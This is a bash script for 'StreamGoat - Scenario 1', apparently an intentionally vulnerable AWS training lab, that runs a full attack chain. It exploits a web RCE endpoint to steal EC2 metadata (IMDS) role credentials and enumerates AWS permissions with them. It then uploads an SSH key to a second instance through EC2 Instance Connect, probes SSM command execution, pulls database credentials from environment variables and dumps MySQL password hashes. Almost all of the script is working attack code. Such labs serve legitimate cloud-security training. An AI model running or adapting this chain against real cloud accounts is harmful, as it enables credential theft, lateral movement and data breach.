#!/usr/bin/env bash
set -euo pipefail

#############################################
# Pretty TUI: colors, banner, spinner, utils
#############################################

if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
  if command -v tput >/dev/null 2>&1 && [ "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]; then
    RED="$(tput setaf 1)"; GREEN="$(tput setaf 2)"; YELLOW="$(tput setaf 3)"; BLUE="$(tput setaf 4)"
    MAGENTA="$(tput setaf 5)"; CYAN="$(tput setaf 6)"; BOLD="$(tput bold)"; RESET="$(tput sgr0)"
  else
    RED=$'\033[31m'; GREEN=$'\033[32m'; YELLOW=$'\033[33m'; BLUE=$'\033[34m'
    MAGENTA=$'\033[35m'; CYAN=$'\033[36m'; BOLD=$'\033[1m'; RESET=$'\033[0m'
  fi
else
  RED=""; GREEN=""; YELLOW=""; BLUE=""; MAGENTA=""; CYAN=""; BOLD=""; RESET=""
fi

step() { printf "\n[%s] %s[*]%s %s\n" "$(date +%H:%M:%S)" "${YELLOW}" "${RESET}" "$*"; }
ok()   { printf "[%s] %s[OK]%s  %s\n" "$(date +%H:%M:%S)" "${GREEN}" "${RESET}" "$*"; }
err()  { printf "[%s] %s[ERR]%s %s\n" "$(date +%H:%M:%S)" "${RED}" "${RESET}" "$*"; }
info() { printf "%s[i]%s   %s\n"  "${BLUE}"   "${RESET}" "$*"; }

printf "%s%s%s\n" "${BOLD}${GREEN}" "  ________  ___  _____          __     " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" " / ___/ _ \/ _ \/ ___/__  ___ _/ /_    " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "/ /__/ // / , _/ (_ / _ \/ _ \`/ __/   " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "\\___/____/_/|_|\\___/\\___/\\_,_/\\__/" "${RESET}"
printf "\n"

SPIN_PID=""
spin_start() {
  local msg="$*"
  printf "%s[>] %s%s " "${MAGENTA}" "${msg}" "${RESET}"
  ( while :; do
      for c in '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏'; do
        printf "\r%s[>] %s%s %s" "${MAGENTA}" "${msg}" "${RESET}" "$c"
        sleep 0.08
      done
    done ) & SPIN_PID=$!
  disown || true
}
spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }

banner() {
  printf "%s%s%s\n" "${BOLD}${CYAN}" "===            StreamGoat - Scenario 1              ===" "${RESET}"
  printf "%sThis automated attack script will:%s\n" "${GREEN}" "${RESET}"
  printf "  • Step 1. Exploitation of Web RCE, IMDS stealing on EC2a\n"
  printf "  • Step 2. Permission enumeration for stolen IMDS\n"
  printf "  • Step 3. Access gathering to EC2b via uploading new sshkey\n"
  printf "  • Step 4. Stealing credentials to access RDS\n"
  printf "  • Step 5. Accessing sensitive data in RDS\n"
}
banner

#############################################
# Preflight checks (no changes to your logic)
#############################################
step "Preflight checks"
missing=0
for c in aws curl jq; do
  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
done
[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }

read -r -p "Everything is prepared. Press Enter to start (or Ctrl+C to abort)..." _ || true
#############################################
# Step 1. Exploitation of Web RCE, IMDS stealing
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Exploitation of Web RCE, IMDS stealing  ===" "${RESET}"
is_valid_ipv4() {
  local ip="$1" o1 o2 o3 o4
  [[ $ip =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || return 1
  IFS='.' read -r o1 o2 o3 o4 <<<"$ip"
  for o in "$o1" "$o2" "$o3" "$o4"; do
    [[ $o =~ ^[0-9]+$ ]] && (( o >= 0 && o <= 255 )) || return 1
  done
  return 0
}

# ---- Prompt + IP format validation loop (keeps asking until valid) ----
step "Target selection"
while :; do
  read -r -p "Enter IP of vulnerable application: " TARGET_IP
  if is_valid_ipv4 "$TARGET_IP"; then
    ok "IP format looks valid: $TARGET_IP"
    break
  else
    err "Invalid IPv4 address. Expected dotted quad (e.g., 203.0.113.10). Try again."
  fi
done

TARGET="http://$TARGET_IP/cmd"

# ---- Connectivity check: require HTTP 200 on /cmd?c=id ----
step "Probing $TARGET for RCE reachability (expects HTTP 200)"
spin_start "Sending test request (c=id)"
set +e
HTTP_CODE="$(curl -sS -m 8 --connect-timeout 4 -o /dev/null -w "%{http_code}" \
                  -G --data-urlencode c=id "$TARGET")"
CURL_RC=$?
set -e
spin_stop

if [ $CURL_RC -ne 0 ]; then
  err "curl failed (exit $CURL_RC). Check SG/NACL/route/DNS."
  exit 1
fi
if [ "$HTTP_CODE" != "200" ]; then
  err "Endpoint responded with HTTP $HTTP_CODE (expected 200). Aborting."
  exit 1
fi
ok "RCE endpoint reachable (HTTP 200) — proceeding."

step "Verification of exploitation: $TARGET?c=id"
ok "$(curl -sG $TARGET?c=id)"

# Fetch creds JSON from the target (same logic you used), safely URL-encoded via stdin
spin_start "Fetching instance credentials from IMDS via remote /cmd"
CREDS_JSON="$(curl -sG --data-urlencode "c@-" "$TARGET" <<'EOF'
/usr/bin/env bash -lc '
S=/tmp/creds
if [ "$AWS_EXECUTION_ENV" = "AWS_ECS_FARGATE" ]; then
  curl -s "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" > "$S"
else
  T=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
  N=$(curl -s -o /tmp/n -w "%{http_code}" -H "X-aws-ec2-metadata-token: $T" "http://169.254.169.254/latest/meta-data/iam/security-credentials/")
  if [ "$N" = 200 ]; then
    N=$(cat /tmp/n)
    curl -s -H "X-aws-ec2-metadata-token: $T" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$N" > "$S"
  else
    curl -s -H "X-aws-ec2-metadata-token: $T" "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance/" > "$S"
  fi
fi
cat "$S"
'
EOF
)"
spin_stop

# Parse & set default profile
AKID=$(jq -r '.AccessKeyId'    <<<"$CREDS_JSON")
SECK=$(jq -r '.SecretAccessKey' <<<"$CREDS_JSON")
SESS=$(jq -r '.Token'           <<<"$CREDS_JSON")
EXP=$(jq -r '.Expiration'       <<<"$CREDS_JSON")

if [ -z "$AKID" ] || [ "$AKID" = "null" ]; then
  echo "Failed to parse creds JSON:" >&2
  echo "$CREDS_JSON" | sed -e 's/./&/120g' >&2
  exit 1
else
  ok "IMDS successfully stolen"
  info "AccessKeyId: $AKID"
  info "Expiration : $EXP"
fi
spin_start "Configuring awscli profile"
PROFILE="streamgoat-scenario-1"
aws configure set aws_access_key_id     "$AKID"   --profile default --profile "$PROFILE"
aws configure set aws_secret_access_key "$SECK"   --profile default --profile "$PROFILE"
aws configure set aws_session_token     "$SESS"   --profile default --profile "$PROFILE"
aws configure set region                us-east-1 --profile default --profile "$PROFILE"  # adjust if needed
spin_stop
printf "\n"
read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
#############################################
# End of Step 1
#############################################
# Step 2. Permission enumeration for stolen IMDS
#############################################
printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 2. Permission enumeration for stolen IMDS  ===" "${RESET}"
# init colors (portable)

try() {
  local desc="$1"; shift
  local rc
  set +e
  "$@" >/dev/null 2>&1
  rc=$?
  set -e
  if [ $rc -eq 0 ]; then
    printf "[%s] %s[OK]%s    %s\n" "$(date +%H:%M:%S)" "$GREEN" "$RESET" "$desc"
  else
    printf "[%s] %s[DENY]%s  %s\n" "$(date +%H:%M:%S)" "$RED" "$RESET" "$desc"
  fi
}


# Identity/context
try "STS GetCallerIdentity" aws sts get-caller-identity --profile "$PROFILE"
aws sts get-caller-identity --profile "$PROFILE"
try "List account aliases"  aws iam list-account-aliases --profile "$PROFILE"

# Inventory
try "EC2 DescribeInstances" aws ec2 describe-instances --max-items 5 --profile "$PROFILE"
aws ec2 describe-instances  --profile "$PROFILE" \
  --filters "Name=tag:Name,Values=StreamGoat-*" \
            "Name=instance-state-name,Values=running" \
  --query 'Reservations[].Instances[].{Id:InstanceId,State:State.Name,PublicIP:PublicIpAddress,PrivateIP:PrivateIpAddress,Name: Tags[?Key==`Name`]|[0].Value}' \
  --output table
try "S3 ListAllMyBuckets"   aws s3api list-buckets --profile "$PROFILE"
try "Secrets ListSecrets"   aws secretsmanager list-secrets --max-results 5 --profile "$PROFILE"
try "SSM GetParametersByPath /" aws ssm get-parameters-by-path --path / --max-results 5 --profile "$PROFILE"
try "SSM DescribeInstances" aws ssm describe-instance-information --profile "$PROFILE"
try "KMS ListKeys"          aws kms list-keys --limit 5 --profile "$PROFILE"
try "ECR DescribeRepos"     aws ecr describe-repositories --max-results 5 --profile "$PROFILE"
try "Lambda ListFunctions"  aws lambda list-functions --max-items 5 --profile "$PROFILE"
try "DDB ListTables"        aws dynamodb list-tables --max-items 5 --profile "$PROFILE"
try "RDS DescribeDBs"       aws rds describe-db-instances --max-records 20 --profile "$PROFILE"
try "Logs DescribeLogGroups" aws logs describe-log-groups --limit 5 --profile "$PROFILE"
try "CloudTrail DescribeTrails" aws cloudtrail describe-trails --profile "$PROFILE"

printf "\n"
read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
#############################################
# End of Step 2
#############################################
# Step 3. Step 3. Access gathering to EC2b
#############################################
printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 3. Access gathering to EC2b  ===" "${RESET}"
printf "We are going to validate two more permissions which may give us direct access to EC2b\n"
read IID AZ PUBIP <<<"$(aws ec2 describe-instances  --profile "$PROFILE" \
  --filters 'Name=instance-state-name,Values=running' 'Name=tag:Name,Values=StreamGoat-EC2b' \
  --query 'Reservations[].Instances[][InstanceId,Placement.AvailabilityZone,PublicIpAddress]' \
  --output text | head -n1)"

: "${IID:?no instance found}"
: "${AZ:?no AZ found}"

# -------------------------
# (A) EC2 Instance Connect
# -------------------------
# Requirements:
#   - IAM on the *caller*: ec2-instance-connect:SendSSHPublicKey (resource: the instance ARN)
#   - Network: you still need network/SecGrp open to actually SSH (permission probe works w/o it)
#   - OS user commonly 'ubuntu' (Ubuntu), 'ec2-user' (Amazon Linux), 'admin' (Debian), etc.
EIC_OSUSER="${EIC_OSUSER:-ubuntu}"

# Generate a throwaway key
rm -f /tmp/streamgoat_eic_* 2>/dev/null || true
KEY=/tmp/streamgoat_eic_$$
ssh-keygen -t ed25519 -N '' -f "$KEY" -q

step "Attempts to upload SSH key via AWS api"
# Permission probe (does the API let us publish a key?)
try "EC2InstanceConnect SendSSHPublicKey ($EIC_OSUSER@$PUBIP)" \
  aws ec2-instance-connect send-ssh-public-key  --profile "$PROFILE" \
    --instance-id "$IID" \
    --availability-zone "$AZ" \
    --instance-os-user "$EIC_OSUSER" \
    --ssh-public-key "file://$KEY.pub" \
    --query Success --output text

if [ -n "$PUBIP" ]; then
  echo "Execution of$YELLOW id$RESET command: ssh -i $KEY -o StrictHostKeyChecking=no -o ConnectTimeout=5 $EIC_OSUSER@$PUBIP 'id'"
  ssh -i "$KEY" -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$EIC_OSUSER@$PUBIP" 'id' || info "SSH attempt failed (user/SG/network)"
fi

# -------------------------
# (B) SSM Command Execution
# -------------------------
# Permission-aware probe: interpret AccessDenied vs TargetNotConnected
step "Attempts to execute command via AWS Systems Manager (SSM)"
ssm_probe() {
  local iid="$1"
  local out rc cmdId

  # Run the call once, capture output safely under set -e
  set +e
  out="$(aws ssm send-command  --profile "$PROFILE" \
          --document-name AWS-RunShellScript \
          --parameters commands='["whoami"]' \
          --instance-ids "$iid" \
          --comment "perm-probe $(date)" 2>&1)"
  rc=$?
  set -e

  if [ $rc -eq 0 ]; then
    cmdId="$(jq -r '.Command.CommandId' <<<"$out" 2>/dev/null)"
    try "SSM SendCommand permitted; CommandId=${cmdId:-<unknown>}" true
    # Optional: fetch invocation result (may be Pending/Success/Error)
    aws ssm get-command-invocation  --profile "$PROFILE" --command-id "${cmdId}" --instance-id "$iid" --output table || true

  elif grep -qi 'TargetNotConnected' <<<"$out"; then
    try "SSM SendCommand allowed, but instance is not SSM-connected (agent/role/network)" true

  elif grep -qi 'AccessDenied' <<<"$out"; then
    try "SSM SendCommand not permitted (AccessDenied)" false

  else
    err "SSM SendCommand unexpected error (printing raw output below)"
    printf "%s\n" "$out"
  fi
}

ssm_probe "$IID"
printf "\n"
read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
#############################################
# End of Step 3
#############################################
# Step 4. Stealing credentials to access RDS
#############################################
printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 4. Stealing credentials to access RDS  ===" "${RESET}"
printf "On previous steps we successfully identify public IP of EC2b and uploaded our ssh key on it. Now we can connect to the host and look around.\n"
step "Looking for locally stored credentials"
ok "Database credentials were found in environment variables:"
ssh -i "$KEY" "$EIC_OSUSER@$PUBIP" "bash -lc 'env | grep ^DB_'"
step "Attempt to connect to DB with identified credentials"
ok "Successfully connected"
printf "Executing$YELLOW SELECT CURRENT_USER(), @@hostname, @@version;$RESET\n"
ssh -i "$KEY" "$EIC_OSUSER@$PUBIP" "bash -lc 'MYSQL_PWD=\$DB_PASS mysql -h \"\$DB_HOST\" -P \"\$DB_PORT\" -u \"\$DB_USER\" -t -e \"SELECT CURRENT_USER(), @@hostname, @@version;\"'"
printf "\n"
read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
#############################################
# End of Step 4
#############################################
# Step 5. Accessing sensitive data in RDS
#############################################
printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 5. Accessing sensitive data in RDS  ===" "${RESET}"
printf "Executing$YELLOW SELECT User,plugin,authentication_string from user;$RESET\n"
ssh -i "$KEY" "$EIC_OSUSER@$PUBIP" "bash -lc 'MYSQL_PWD=\$DB_PASS mysql -h \"\$DB_HOST\" -P \"\$DB_PORT\" -u \"\$DB_USER\" -D mysql -t -e \"SELECT User,plugin,authentication_string from user;\"'"
printf "\n"
rm -rf /tmp/streamgoat_eic_*
read -r -p "Scenario successfully completed. Press Enter or Ctrl+C to exit" _ || true